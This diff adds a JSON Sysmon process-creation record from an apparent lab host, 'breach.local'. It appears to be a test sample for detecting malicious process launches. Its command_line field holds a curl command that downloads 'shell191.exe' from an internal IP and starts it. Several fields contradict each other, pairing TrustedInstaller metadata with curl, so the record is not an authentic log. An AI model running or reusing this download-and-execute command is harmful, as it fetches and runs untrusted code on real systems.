@@ -1,0 +1,134 @@
+{
+  "@timestamp": "2021-02-04T23:01:12.511Z",
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 23:01:12.511\nProcessGuid: {19FC45AC-7CB8-601C-0000-00106C800D00}\nProcessId: 4032\nImage: C:\\Windows\\servicing\\TrustedInstaller.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows Modules Installer\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: TrustedInstaller.exe\nCommandLine: C:\\Windows\\servicing\\TrustedInstaller.exe\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {19FC45AC-76E7-601C-0000-0020E7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: MD5=2C49B175AEE1D4364B91B531417FE583,SHA256=6C7995E18F84E465C376D1D5F153C15ACB66CDEA86EE5BF186677F572E7E129B\nParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}\nParentProcessId: 440\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe",
+  "winlog": {
+    "process": {
+      "pid": 1904,
+      "thread": {
+        "id": 308
+      }
+    },
+    "api": "wineventlog",
+    "version": 5,
+    "task": "Process Create (rule: ProcessCreate)",
+    "computer_name": "CLIENT3.breach.local",
+    "user": {
+      "type": "User",
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM",
+      "domain": "NT AUTHORITY"
+    },
+    "event_data": {
+      "LogonGuid": "{19FC45AC-76E7-601C-0000-0020E7030000}",
+      "Company": "Microsoft Corporation",
+      "LogonId": "0x3e7",
+      "Description": "Windows Modules Installer",
+      "TerminalSessionId": "0",
+      "Product": "The curl executable",
+      "FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)",
+      "OriginalFileName": "TrustedInstaller.exe",
+      "IntegrityLevel": "System"
+    },
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "event_id": 1,
+    "opcode": "Info",
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "record_id": 1510,
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+  },
+  "event": {
+    "category": [
+      "process"
+    ],
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T23:01:14.954Z",
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "module": "sysmon",
+    "type": [
+      "start",
+      "process_start"
+    ]
+  },
+  "hash": {
+    "md5": "2c49b175aee1d4364b91b531417fe583",
+    "sha256": "6c7995e18f84e465c376d1d5f153c15acb66cdea86ee5bf186677f572e7e129b"
+  },
+  "agent": {
+    "ephemeral_id": "177650cc-629c-4abf-8b93-a90e2e515251",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT3",
+    "type": "winlogbeat",
+    "version": "7.10.2",
+    "hostname": "CLIENT3"
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "log": {
+    "level": "information"
+  },
+  "host": {
+    "architecture": "x86",
+    "os": {
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0",
+      "platform": "windows",
+      "version": "6.1",
+      "family": "windows",
+      "name": "Windows 7 Professional"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "ip": [
+      "192.168.56.103",
+      "172.16.1.3",
+      "fe80::5efe:c0a8:3867",
+      "fe80::5efe:ac10:103"
+    ],
+    "name": "CLIENT3.breach.local",
+    "mac": [
+      "00:50:56:00:03:03",
+      "00:50:56:00:00:03",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ],
+    "hostname": "CLIENT3"
+  },
+  "process": {
+    "pid": 4032,
+    "working_directory": "C:\\Windows\\system32\\",
+    "args": [
+      "C:\\Windows\\servicing\\TrustedInstaller.exe"
+    ],
+    "hash": {
+      "md5": "2c49b175aee1d4364b91b531417fe583",
+      "sha256": "6c7995e18f84e465c376d1d5f153c15acb66cdea86ee5bf186677f572e7e129b"
+    },
+    "name": "TrustedInstaller.exe",
+    "entity_id": "{19FC45AC-7CB8-601C-0000-00106C800D00}",
+    "executable": "C:\\Users\\Administrator\\Downloads\\curl-7.76.0-win64-mingw\\bin\\curl.exe",
+    "command_line": "curl --remote-name http://192.168.191.1/shell191.exe & start shell191.exe",
+    "parent": {
+      "command_line": "C:\\Windows\\system32\\services.exe",
+      "name": "services.exe",
+      "args": [
+        "C:\\Windows\\system32\\services.exe"
+      ],
+      "entity_id": "{19FC45AC-76E7-601C-0000-001081630000}",
+      "pid": 440,
+      "executable": "C:\\Windows\\System32\\services.exe"
+    }
+  },
+  "user": {
+    "domain": "NT AUTHORITY",
+    "name": "SYSTEM"
+  },
+  "related": {
+    "user": "SYSTEM",
+    "hash": [
+      "2c49b175aee1d4364b91b531417fe583",
+      "6c7995e18f84e465c376d1d5f153c15acb66cdea86ee5bf186677f572e7e129b"
+    ]
+  }
+}
